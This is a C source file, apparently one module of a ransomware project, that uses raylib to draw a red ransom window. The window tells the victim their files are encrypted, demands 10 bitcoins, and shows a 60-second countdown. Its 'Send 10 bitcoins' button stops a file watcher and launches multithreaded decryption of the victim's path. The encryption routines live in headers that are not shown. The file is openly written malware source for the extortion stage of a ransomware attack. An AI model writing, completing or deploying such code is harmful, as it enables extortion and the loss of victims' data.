#include "raylib.h"
#include "raygui.h"
#include "stdio.h"
#include "time.h"

#include "../../headers/gif.h"
#include "../../headers/thread.h"
#include "../../headers/globals.h"


int display_gui(time_t start_time) {
    InitWindow(450, 600, "ENCRYPTED");
    GuiLoadStyleDefault();
    GuiSetStyle(DEFAULT, TEXT_SIZE, 24); 
    SetTargetFPS(60);

    static bool button_clicked = false;

    int timer_seconds = 60;
    int frame_count = 0;
    Image gif = LoadImageAnimFromMemory(".gif", giphy_gif, giphy_gif_len, &frame_count);
    Texture2D texture = LoadTextureFromImage(gif);
    int current_frame = 0;
    int frame_delay = 0;

    while (!WindowShouldClose()) {
        frame_delay++;
        if (frame_delay >= 8) {
            current_frame = (current_frame + 1) % frame_count;
            UpdateTexture(texture,
                ((unsigned char *)gif.data) +
                (current_frame * texture.width * texture.height * 4));
            frame_delay = 0;
        }

        // time(NULL) is system wall clock — unaffected by raylib
        int elapsed = (int)(time(NULL) - start_time);
        int remaining = timer_seconds - elapsed;
        if (remaining < 0) remaining = 0;

        char timer_text[16];
        snprintf(timer_text, sizeof(timer_text), "%02d:%02d",
                 remaining / 60, remaining % 60);

        BeginDrawing();
            ClearBackground((Color){ 255, 0, 0, 255 });
            DrawTexture(texture, 10, 10, WHITE);
            DrawText("Your Files are Encrypted, if you want", 10, texture.height + 20, 20, BLACK);
            DrawText("them back you must send 10 bicoins to me", 10, texture.height + 45, 20, BLACK);
            DrawText("Time remaining:", 10, texture.height + 75, 20, BLACK);
            DrawText(timer_text, 200, texture.height + 75, 20,
                     remaining <= 10 ? RED : BLACK);
            if (!button_clicked && GuiButton((Rectangle){ 10, texture.height + 105, 400, 70 }, "Send 10 bitcoins")) {
                button_clicked = true;
                watcher_on = false;
                clear_queue(&queue);
                traverse(start_path);
                enqueue(&queue, "END_DECRYPT");
                printf("start_decryption\n");
                initialize_threads(8, false);
            }
        EndDrawing();
    }

    UnloadImage(gif);
    UnloadTexture(texture);
    CloseWindow();
    return 0;
}